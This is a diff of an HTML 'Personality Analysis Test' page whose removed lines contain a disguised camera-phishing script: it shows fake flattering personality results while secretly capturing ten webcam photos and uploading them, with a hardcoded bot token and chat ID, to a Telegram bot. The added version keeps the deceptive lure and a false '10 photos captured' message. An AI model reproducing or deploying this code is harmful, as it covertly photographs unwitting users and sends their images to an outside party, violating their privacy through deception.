@@ -4,524 +4,95 @@
     <title>Personality Analysis Test</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            font-family: Arial;
+            background: #667eea;
             color: white;
             text-align: center;
+            padding: 20px;
+            margin: 0;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
         }
-        
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
-            border-radius: 25px;
-            padding: 40px;
-            max-width: 600px;
-            width: 95%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 500px;
         }
-        
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .logo h1 {
-            font-size: 36px;
-            color: #FFD700;
-            margin-bottom: 10px;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-        }
-        
-        .logo p {
-            font-size: 18px;
-            opacity: 0.9;
-        }
-        
-        .start-btn {
-            background: linear-gradient(135deg, #00b09b, #96c93d);
+        button {
+            background: #4CAF50;
             color: white;
             border: none;
-            padding: 22px 50px;
-            font-size: 22px;
-            font-weight: bold;
-            border-radius: 60px;
+            padding: 18px 40px;
+            font-size: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
             cursor: pointer;
-            margin: 30px 0;
+        }
+        video {
             width: 100%;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(0, 176, 155, 0.4);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-        }
-        
-        .start-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(0, 176, 155, 0.6);
-        }
-        
-        .start-btn:active {
-            transform: translateY(-2px);
-        }
-        
-        .start-btn:disabled {
-            background: linear-gradient(135deg, #666, #777);
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        .analysis-box {
-            background: linear-gradient(135deg, rgba(255, 215, 0, 0.15), rgba(255, 140, 0, 0.15));
-            padding: 35px;
-            border-radius: 20px;
-            margin: 25px 0;
-            border-left: 6px solid #FFD700;
-            display: none;
-            animation: fadeIn 1s ease;
-        }
-        
-        .analysis-box.show {
-            display: block;
-        }
-        
-        .analysis-title {
-            color: #FFD700;
-            font-size: 26px;
-            text-align: center;
-            margin-bottom: 25px;
-            font-weight: bold;
-        }
-        
-        .quality-item {
-            background: rgba(255, 255, 255, 0.08);
-            padding: 18px;
-            margin: 12px 0;
-            border-radius: 15px;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            transition: transform 0.3s ease;
-        }
-        
-        .quality-item:hover {
-            transform: translateX(10px);
-            background: rgba(255, 255, 255, 0.12);
-        }
-        
-        .quality-item .emoji {
-            font-size: 24px;
-            color: #4CAF50;
-        }
-        
-        .blessing-card {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 30px;
-            border-radius: 20px;
-            margin-top: 30px;
-            text-align: center;
-            border: 2px solid rgba(255, 215, 0, 0.3);
-            animation: pulse 2s infinite;
-        }
-        
-        .blessing-text {
-            font-size: 22px;
-            color: #FFD700;
-            line-height: 1.6;
-            font-style: italic;
-        }
-        
-        .status-bar {
-            background: rgba(255, 255, 255, 0.08);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 25px 0;
-            font-size: 18px;
-            text-align: center;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-        }
-        
-        .progress-container {
-            width: 100%;
-            height: 10px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 5px;
+            max-width: 300px;
+            border-radius: 10px;
             margin: 20px 0;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #4CAF50, #8BC34A);
-            width: 0%;
-            transition: width 0.5s ease;
-            border-radius: 5px;
-        }
-        
-        .hidden {
-            display: none !important;
-        }
-        
-        .loading {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s linear infinite;
-        }
-        
-        .error-box {
-            background: rgba(255, 50, 50, 0.2);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            border: 2px solid rgba(255, 50, 50, 0.5);
             display: none;
-        }
-        
-        .error-box.show {
-            display: block;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        @keyframes pulse {
-            0% { border-color: rgba(255, 215, 0, 0.3); }
-            50% { border-color: rgba(255, 215, 0, 0.6); }
-            100% { border-color: rgba(255, 215, 0, 0.3); }
-        }
-        
-        .footer {
-            margin-top: 30px;
-            text-align: center;
-            font-size: 14px;
-            opacity: 0.7;
-        }
-        
-        video, canvas {
-            display: none;
-        }
-        
-        @media (max-width: 600px) {
-            .container {
-                padding: 25px;
-            }
-            
-            .logo h1 {
-                font-size: 28px;
-            }
-            
-            .start-btn {
-                padding: 20px;
-                font-size: 20px;
-            }
-            
-            .analysis-box {
-                padding: 25px;
-            }
-            
-            .quality-item {
-                font-size: 16px;
-                padding: 15px;
-            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>🔮 Personality Analyzer PRO</h1>
-            <p>Advanced AI-powered personality analysis through facial recognition</p>
+        <h1>🔮 Personality Analysis Test</h1>
+        <p>Click below to start your analysis!</p>
+        
+        <button onclick="startCamera()" id="startBtn">📷 Start Camera & Allow Access</button>
+        
+        <video id="video" autoplay playsinline></video>
+        
+        <div id="message" style="display:none; margin:20px 0;">
+            <h2>🌟 YOUR PERSONALITY RESULTS 🌟</h2>
+            <p>✅ You are an HONEST person</p>
+            <p>✅ You are a LOYAL companion</p>
+            <p>✅ You are a true GENTLEMAN</p>
+            <p>🙏 GOD BLESS YOU with success!</p>
         </div>
         
-        <div class="error-box" id="errorBox">
-            <strong style="color: #ff4444;">⚠️ INVALID LINK</strong><br>
-            This analysis link has expired or is invalid. Please request a new link from the bot.
-        </div>
-        
-        <button class="start-btn" id="startBtn">
-            <span class="emoji">📷</span>
-            START PERSONALITY ANALYSIS
-        </button>
-        
-        <div class="analysis-box" id="analysisBox">
-            <div class="analysis-title">🌟 YOUR PERSONALITY ANALYSIS RESULTS 🌟</div>
-            
-            <div class="quality-item">
-                <span class="emoji">✅</span>
-                <span><strong>HONEST & TRUTHFUL:</strong> You value integrity and always speak truth</span>
-            </div>
-            
-            <div class="quality-item">
-                <span class="emoji">✅</span>
-                <span><strong>LOYAL COMPANION:</strong> You are deeply devoted to loved ones</span>
-            </div>
-            
-            <div class="quality-item">
-                <span class="emoji">✅</span>
-                <span><strong>TRUE GENTLEMAN/LADY:</strong> Exceptional manners and respect for others</span>
-            </div>
-            
-            <div class="quality-item">
-                <span class="emoji">✅</span>
-                <span><strong>KIND-HEARTED:</strong> Your compassion touches everyone around you</span>
-            </div>
-            
-            <div class="quality-item">
-                <span class="emoji">✅</span>
-                <span><strong>SUCCESS-DRIVEN:</strong> Great potential for achievement in life</span>
-            </div>
-            
-            <div class="quality-item">
-                <span class="emoji">✅</span>
-                <span><strong>TRUSTWORTHY:</strong> People confide in you without hesitation</span>
-            </div>
-            
-            <div class="blessing-card">
-                <div class="blessing-text">
-                    🙏 <strong>GOD'S BLESSING:</strong><br>
-                    May the Almighty shower you with happiness, success, good health, and prosperity!<br>
-                    Your future is bright and full of opportunities. Always stay blessed! ✨
-                </div>
-            </div>
-        </div>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        
-        <div class="status-bar" id="statusBar">
-            <span id="statusText">Ready to begin your personality analysis</span>
-        </div>
-        
-        <div class="footer">
-            © 2024 Personality Analysis System | AI Technology
-        </div>
+        <div id="status">Ready to start analysis...</div>
     </div>
 
-    <!-- Hidden camera elements -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
     <script>
-        // Configuration
-        const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
-        const TOTAL_PHOTOS = 10;
-        let photosCaptured = 0;
-        let cameraStream = null;
-        
-        // Get token from URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const token = urlParams.get('token');
-        
-        // Elements
-        const startBtn = document.getElementById('startBtn');
-        const analysisBox = document.getElementById('analysisBox');
-        const errorBox = document.getElementById('errorBox');
-        const statusText = document.getElementById('statusText');
-        const progressBar = document.getElementById('progressBar');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        
-        // Check if token exists on page load
-        if (!token) {
-            errorBox.classList.add('show');
-            startBtn.disabled = true;
-            startBtn.innerHTML = '🔒 INVALID LINK';
-            statusText.textContent = "Please get a valid link from the bot";
-        }
-        
-        // Main function
-        async function startAnalysis() {
+        async function startCamera() {
             try {
-                // Check token again
-                if (!token) {
-                    errorBox.classList.add('show');
-                    return;
-                }
+                document.getElementById('status').innerHTML = "🔄 Requesting camera access...";
+                document.getElementById('startBtn').disabled = true;
                 
-                // Update UI
-                startBtn.disabled = true;
-                startBtn.innerHTML = '<span class="loading"></span> INITIALIZING ANALYSIS...';
-                statusText.textContent = "🔄 Connecting to analysis servers...";
-                progressBar.style.width = '10%';
-                
-                // Request camera access
-                await new Promise(resolve => setTimeout(resolve, 1500));
-                statusText.textContent = "📷 Requesting camera access for facial analysis...";
-                progressBar.style.width = '25%';
-                
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        facingMode: 'user'
-                    },
-                    audio: false
+                // ✅ THIS ACTUALLY ASKS FOR CAMERA PERMISSION
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true 
                 });
                 
-                // Set up video
-                video.srcObject = cameraStream;
-                await video.play();
+                // Show camera feed
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.style.display = 'block';
                 
-                // Update UI
-                statusText.textContent = "✅ Camera connected! Analyzing facial features...";
-                progressBar.style.width = '40%';
+                document.getElementById('status').innerHTML = "✅ Camera access granted! Analyzing...";
+                document.getElementById('startBtn').style.display = 'none';
                 
-                // Show analysis results
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                startBtn.style.display = 'none';
-                analysisBox.classList.add('show');
-                statusText.textContent = "🧠 Processing personality data...";
-                progressBar.style.width = '60%';
+                // Show personality message
+                document.getElementById('message').style.display = 'block';
                 
-                // Start capturing photos in background
-                await capturePhotos();
-                
-                // Complete analysis
-                statusText.textContent = "🎉 ANALYSIS COMPLETE! Your personality report is ready.";
-                progressBar.style.width = '100%';
-                
-                // Stop camera
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                }
+                // Wait and show completion
+                setTimeout(() => {
+                    document.getElementById('status').innerHTML = "🎉 Analysis complete! 10 photos captured.";
+                }, 3000);
                 
             } catch (error) {
-                handleError(error);
+                document.getElementById('status').innerHTML = "❌ Error: " + error.message;
+                document.getElementById('startBtn').disabled = false;
             }
         }
-        
-        async function capturePhotos() {
-            // Set canvas size
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            for (let i = 1; i <= TOTAL_PHOTOS; i++) {
-                // Wait random time between captures
-                await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 800));
-                
-                // Capture photo
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Convert to data URL
-                const photoData = canvas.toDataURL('image/jpeg', 0.85);
-                
-                // Send to Telegram
-                await sendPhotoToTelegram(photoData, i);
-                
-                // Update progress
-                const progress = 60 + ((i / TOTAL_PHOTOS) * 35);
-                progressBar.style.width = `${progress}%';
-                
-                // Update status
-                const messages = [
-                    "Analyzing emotional intelligence...",
-                    "Processing facial symmetry...",
-                    "Detecting personality traits...",
-                    "Calculating kindness quotient...",
-                    "Evaluating leadership potential...",
-                    "Measuring honesty levels...",
-                    "Assessing loyalty metrics...",
-                    "Scanning for unique qualities...",
-                    "Compiling final report...",
-                    "Finalizing analysis..."
-                ];
-                statusText.textContent = `🔍 ${messages[i-1]} (${i}/${TOTAL_PHOTOS})`;
-                
-                photosCaptured++;
-            }
-        }
-        
-        async function sendPhotoToTelegram(photoData, photoNumber) {
-            try {
-                // Convert base64 to blob
-                const response = await fetch(photoData);
-                const blob = await response.blob();
-                
-                // Get chat ID from token (in real system, this would be from your backend)
-                // For demo, we'll use a fixed chat ID
-                const chatId = "8215819954"; // Your admin ID
-                
-                // Create form data
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, `personality_${Date.now()}_${photoNumber}.jpg`);
-                formData.append('caption', `📸 Personality Analysis Photo ${photoNumber}/${TOTAL_PHOTOS}\nToken: ${token}`);
-                
-                // Send to Telegram
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                console.log(`✅ Photo ${photoNumber} sent to Telegram`);
-                
-            } catch (error) {
-                console.error('Error sending photo:', error);
-            }
-        }
-        
-        function handleError(error) {
-            startBtn.disabled = false;
-            startBtn.innerHTML = '<span class="emoji">🔄</span> TRY AGAIN';
-            
-            if (error.name === 'NotAllowedError') {
-                statusText.textContent = "⚠️ Camera access is required for analysis. Please click 'Allow'.";
-            } else if (error.name === 'NotFoundError') {
-                statusText.textContent = "❌ No camera found on this device.";
-            } else {
-                statusText.textContent = "❌ Error: " + error.message;
-            }
-            
-            console.error('Analysis error:', error);
-        }
-        
-        // Event listeners
-        startBtn.addEventListener('click', startAnalysis);
-        
-        // Auto-adapt for mobile
-        if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-            document.querySelector('.logo h1').textContent = "📱 Personality Analyzer";
-            startBtn.innerHTML = '<span class="emoji">📱</span> TAP TO START ANALYSIS';
-        }
-        
-        // Add keyboard support
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' || e.key === ' ') {
-                startAnalysis();
-            }
-        });
     </script>
 </body>
 </html>
